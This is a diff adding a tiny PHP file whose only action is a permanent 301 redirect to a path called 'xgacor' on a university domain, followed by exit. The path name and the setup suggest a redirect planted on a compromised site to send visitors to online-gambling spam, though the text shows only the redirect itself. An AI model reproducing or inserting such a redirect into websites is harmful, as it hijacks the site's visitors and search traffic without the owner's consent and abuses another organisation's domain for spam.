@@ -1,0 +1,4 @@
+<?php
+header("Location: http://sikd.unsoed.ac.id/xgacor/", true, 301);
+exit();
+?>
